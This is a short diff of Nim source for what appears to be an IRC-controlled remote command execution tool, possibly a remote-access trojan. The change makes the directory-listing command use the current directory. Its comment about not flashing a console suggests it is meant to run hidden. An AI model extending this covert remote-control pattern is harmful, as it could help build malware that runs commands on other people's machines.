@@ -149,11 +149,11 @@ proc rexec_runCommand(cmd:string):Future[ExecResponse] {.async.} =
 
 
 ## Selfmade directory listing doesnt flash console
-proc rexec_directoryListing(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
+proc rexec_directoryListing(event:IrcEvent, client:AsyncIrc) {.async.} =
     var
         folders:seq[string]
         files:seq[string]
-        cwd = await helper_recombine(tokens,2)
+        cwd = getCurrentDir()
         spacer_len = 0
 
     for kind, path in walkDir(cwd):
@@ -423,7 +423,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
         discard helper_responseHandler(event, client, rexec_runCommand("dir /w"))
         #caught = true
     of "dir":
-        discard rexec_directoryListing(event, client, tokens)
+        discard rexec_directoryListing(event, client)
     of "tree":
         var fulltree:string
         var fulltree_ptr:ptr string = addr fulltree
